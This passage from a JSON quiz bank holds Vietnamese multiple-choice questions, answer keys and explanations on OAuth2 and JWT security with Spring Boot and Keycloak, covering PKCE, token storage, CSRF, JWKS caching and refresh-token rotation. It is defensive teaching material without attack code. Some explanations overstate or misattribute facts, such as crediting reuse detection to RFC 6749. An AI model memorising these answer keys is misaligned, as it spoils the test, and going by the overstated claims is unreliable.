            "Chuyển sang dùng Implicit Flow để token trả về trực tiếp không cần authorization code",
            "PKCE (Proof Key for Code Exchange) với S256: client sinh ngẫu nhiên code_verifier và chỉ gửi code_challenge khi authorize; tin tặc dù chặn được code cũng không có code_verifier để đổi token",
            "Tăng độ dài của Authorization Code lên 1024 ký tự để không thể đoán mò",
            "Mã hóa Authorization Code bằng thuật toán đối xứng DES"
          ],
          "answer": 1,
          "explain": "PKCE (RFC 7636) bắt buộc trong OAuth 2.1 cho toàn bộ Mobile và SPA. Client giữ bí mật code_verifier trong RAM và chỉ gửi SHA-256 hash (code_challenge) cho server. Kẻ trộm đánh chặn được mã code trên hệ điều hành nhưng không có code_verifier nguyên bản thì không thể hoàn tất bước đổi token tại Token Endpoint.",
          "why": [
            "Implicit Flow đã bị OAuth 2.1 khai tử vì trả token trực tiếp qua URL fragment còn nguy hiểm hơn gấp nhiều lần.",
            "✓ Đúng — PKCE ràng buộc mã ủy quyền với bí mật mật mã động code_verifier chỉ có client hợp lệ nắm giữ. Chặn đứng hoàn toàn Code Interception Attack.",
            "Độ dài mã code không giải quyết được việc bị ứng dụng giả mạo 'nghe trộm' trên hệ điều hành.",
            "DES là thuật toán mã hóa lỗi thời đã bị bẻ gãy từ lâu và không giải quyết được bài toán phân phối khóa trên client công khai."
          ]
        },
        {
          "level": "hard",
          "scenario": "Khi một Single Page Application (React) lưu trữ JWT Access Token trực tiếp trong LocalStorage của trình duyệt, hacker cài cắm được một đoạn mã JavaScript độc hại thông qua thư viện bên thứ 3 (lỗ hổng XSS).",
          "q": "Hậu quả bảo mật nghiêm trọng nhất và giải pháp kiến trúc khắc phục triệt để theo tiêu chuẩn hiện đại là gì?",
          "options": [
            "Hacker có thể dùng document.defaultView.localStorage đọc trộm toàn bộ token và mạo danh người dùng vĩnh viễn; giải pháp là chuyển sang mô hình Backend-For-Frontend (BFF) dùng HttpOnly Secure Cookie",
            "Hacker chỉ đọc được thông tin mã hóa không sử dụng được",
            "Không có nguy cơ vì LocalStorage được bảo vệ bởi hệ điều hành",
            "Chỉ cần mã hóa chuỗi token bằng thuật toán MD5 trước khi lưu"
          ],
          "answer": 0,
          "explain": "LocalStorage hoàn toàn không có cơ chế bảo vệ trước mã độc chạy trên trình duyệt (XSS). Bất kỳ script nào chạy trên trang đều đọc được LocalStorage. Mô hình BFF che giấu token hoàn toàn ở tầng Gateway và chỉ giao tiếp với browser qua HttpOnly Cookie.",
          "why": [
            "✓ Đúng — Đây là khuyến nghị bảo mật cốt lõi của OWASP và IETF OAuth2 Security Best Current Practice.",
            "JWT token dùng để xác thực, nếu hacker có được token thì có thể gửi request giả mạo ngay lập tức.",
            "LocalStorage chỉ được phân vùng theo Origin, không chống được script chạy cùng domain.",
            "MD5 là hàm băm một chiều, không thể giải mã để gửi lên header Authorization."
          ]
        },
        {
          "level": "medium",
          "scenario": "Trong kiến trúc Spring Boot 3 REST API Stateless sử dụng JWT, tại sao lập trình viên bắt buộc phải cấu hình 'csrf(AbstractHttpConfigurer::disable)'?",
          "q": "Lý do kỹ thuật nào biện minh cho việc tắt bảo vệ CSRF trong trường hợp này?",
          "options": [
            "Vì kiến trúc REST API Stateless dùng JWT truyền qua Header 'Authorization: Bearer' không tự động gửi theo request của trình duyệt như Cookie, do đó bản chất đã miễn nhiễm hoàn toàn với tấn công CSRF",
            "Vì CSRF làm giảm tốc độ xử lý của Spring Boot đi 50%",
            "Vì Spring Security 6 không còn hỗ trợ tính năng CSRF",
            "Vì cơ sở dữ liệu không thể lưu trữ CSRF token"
          ],
          "answer": 0,
          "explain": "CSRF (Cross-Site Request Forgery) lợi dụng cơ chế trình duyệt tự động đính kèm Cookie xác thực khi gọi chéo domain. Trong REST API thuần túy dùng Bearer Token lưu trong header, trình duyệt không tự động đính kèm token này, vì vậy CSRF hoàn toàn không thể xảy ra.",
          "why": [
            "✓ Đúng — Hiểu đúng bản chất CSRF giúp lập trình viên tự tin tắt CSRF cho REST API mà không sợ hổng bảo mật.",
            "CSRF filter tốn rất ít CPU, không phải nguyên nhân hiệu năng.",
            "Spring Security vẫn hỗ trợ CSRF rất mạnh cho các ứng dụng dùng Cookie/Session.",
            "CSRF token thường lưu trong session hoặc cookie, không liên quan đến database."
          ]
        },
        {
          "level": "hard",
          "scenario": "Khi tích hợp Spring Boot làm OAuth2 Resource Server với Keycloak, tại sao việc Resource Server tự động cache JWKS (JSON Web Key Set) từ Keycloak lại là yêu cầu sống còn cho hạ tầng?",
          "q": "Hậu quả gì sẽ xảy ra nếu mỗi HTTP request đến đều gọi sang Keycloak để kiểm tra token?",
          "options": [
            "Keycloak sẽ bị quá tải (DDoS nội bộ) và sập máy chủ khi traffic tăng cao, đồng thời làm tăng độ trễ của mọi API lên thêm hàng chục mili-giây mạng",
            "Token sẽ bị biến đổi thành chuỗi rỗng",
            "Spring Boot sẽ bị từ chối kết nối mạng",
            "Không có ảnh hưởng nào vì Keycloak xử lý được hàng triệu request/giây"
          ],
          "answer": 0,
          "explain": "Xác thực JWT bất đối xứng (RSA/ECDSA) được thiết kế để kiểm tra chữ ký số cục bộ (In-memory) bằng Public Key. Bằng cách cache tập JWKS, Spring Boot chỉ cần tải public key 1 lần mỗi ngày và tự xác thực hàng triệu request trong bộ nhớ với độ trễ 0ms.",
          "why": [
            "✓ Đúng — Đây là nguyên lý Zero-Network Verification cốt lõi của kiến trúc Microservices phân tán.",
            "Token là chuỗi bất biến từ client, không bị rỗng.",
            "Mạng vẫn thông suốt nhưng gây nghẽn đường truyền không đáng có.",
            "Gọi mạng nội bộ liên tục cho mỗi request là phản kiến trúc Microservices."
          ]
        },
        {
          "level": "medium",
          "scenario": "Khi người dùng đăng nhập thành công vào Keycloak, token JWT trả về chứa danh sách quyền trong 'realm_access.roles': ['admin', 'manager']. Khi gọi API, Spring Security lại báo lỗi 403 Forbidden.",
          "q": "Nguyên nhân phổ biến nhất gây ra sự không tương thích này giữa Keycloak và Spring Security là gì?",
          "options": [
            "Spring Security mặc định tìm quyền trong claim 'scope' hoặc 'scp' và yêu cầu tiền tố 'ROLE_'; cần viết Custom JwtAuthenticationConverter để ánh xạ đúng claim của Keycloak",
            "Do người dùng chưa bấm kích hoạt tài khoản qua email",
            "Do Keycloak bị lỗi phiên bản",
            "Do Spring Security cấm người dùng có nhiều hơn 1 role"
          ],
          "answer": 0,
          "explain": "Spring Security's DefaultJwtAuthenticationConverter tìm kiếm trong claim 'scope' hoặc 'scp' và gán prefix 'SCOPE_'. Trong khi đó, Keycloak lưu role trong JSON lồng nhau 'realm_access.roles'. Lập trình viên phải tùy biến converter để bóc tách và gán prefix 'ROLE_'.",
          "why": [
            "✓ Đúng — Đây là lỗi tích hợp phổ biến nhất mà 90% kỹ sư gặp phải khi lần đầu kết nối Spring Boot với Keycloak.",
            "Nếu chưa kích hoạt thì Keycloak đã từ chối cấp token ngay từ bước login.",
            "Đây là đặc tả thiết kế khác nhau giữa 2 framework, không phải bug của Keycloak.",
            "Spring Security hỗ trợ hàng trăm role đồng thời cho một Principal."
          ]
        },
        {
          "level": "medium",
          "scenario": "Trong kiến trúc Microservices phân tán, thuật toán ký số JWT nào bắt buộc phải sử dụng để bảo đảm rằng các Resource Services chỉ có quyền kiểm tra tính hợp lệ của token mà KHÔNG THỂ tự ý sinh token giả mạo?",
          "q": "Thuật toán ký số chuẩn xác là gì?",
          "options": [
            "Ký số bất đối xứng (Asymmetric Signing, ví dụ: RS256 hoặc ES256) sử dụng cặp Private Key (tại Auth Server) và Public Key (chia sẻ cho Resource Servers)",
            "Ký số đối xứng (Symmetric Signing, ví dụ: HS256) với 1 secret key duy nhất",
            "Thuật toán mã hóa đối xứng AES-256",
            "Không cần ký số, chỉ cần Base64"
          ],
          "answer": 0,
          "explain": "Ký bất đối xứng sử dụng Private Key (chỉ Identity Server nắm giữ) để ký token và Public Key (chia sẻ công khai) để xác thực. Các Resource Server dù có bị hack cũng chỉ có Public Key, hoàn toàn bất khả thi trong việc tạo ra một token hợp lệ mới.",
          "why": [
            "✓ Đúng — Ký bất đối xứng RS256 là tiêu chuẩn quốc tế cho OAuth2 và OpenID Connect.",
            "HS256 dùng chung 1 khóa, nếu 1 resource server bị xâm nhập thì toàn bộ hệ sinh thái bị lộ khóa ký.",
            "AES là thuật toán mã hóa dữ liệu (Encryption), không phải chữ ký số (Digital Signature).",
            "Base64 không có tính năng bảo mật, ai cũng có thể giả mạo dữ liệu."
          ]
        },
        {
          "level": "medium",
          "scenario": "Khi một Refresh Token bị rò rỉ và hacker sử dụng nó để lấy Access Token mới, sau đó người dùng hợp pháp cũng sử dụng chính Refresh Token đó để refresh.",
          "q": "Cơ chế bảo mật nào của Refresh Token Rotation (RTR) sẽ được kích hoạt để bảo vệ tài khoản?",
          "options": [
            "Cơ chế Phát hiện Tái sử dụng (Reuse Detection): Hệ thống nhận diện token đã qua sử dụng, lập tức thu hồi toàn bộ Token Family và bắt buộc người dùng đăng xuất trên mọi thiết bị",
            "Hệ thống tự động chuyển tiền sang tài khoản của hacker",
            "Hệ thống tự động xóa cơ sở dữ liệu người dùng",
            "Hệ thống gửi tin nhắn SMS cảnh báo nhưng vẫn cho cả hai tiếp tục dùng"
          ],
          "answer": 0,
          "explain": "Refresh Token Rotation quy định mỗi refresh token chỉ dùng được đúng 1 lần. Nếu một token đã bị đánh dấu 'USED' lại xuất hiện lần thứ 2, hệ thống kết luận có ít nhất 1 bên là kẻ trộm và kích hoạt thu hồi toàn bộ token của tài khoản để ngăn chặn truy cập trái phép.",
          "why": [
            "✓ Đúng — Reuse Detection là cơ chế phòng thủ tối thượng của đặc tả OAuth2 RFC 6749.",
            "Hệ thống bảo mật sinh ra để bảo vệ tiền của người dùng.",
            "Xóa DB là hành vi phá hoại, không phải cơ chế bảo mật.",
            "Cho phép cả 2 tiếp tục dùng sẽ tạo điều kiện cho hacker đánh cắp toàn bộ dữ liệu."
          ]
        }
      ]
    }
  ]
}
);
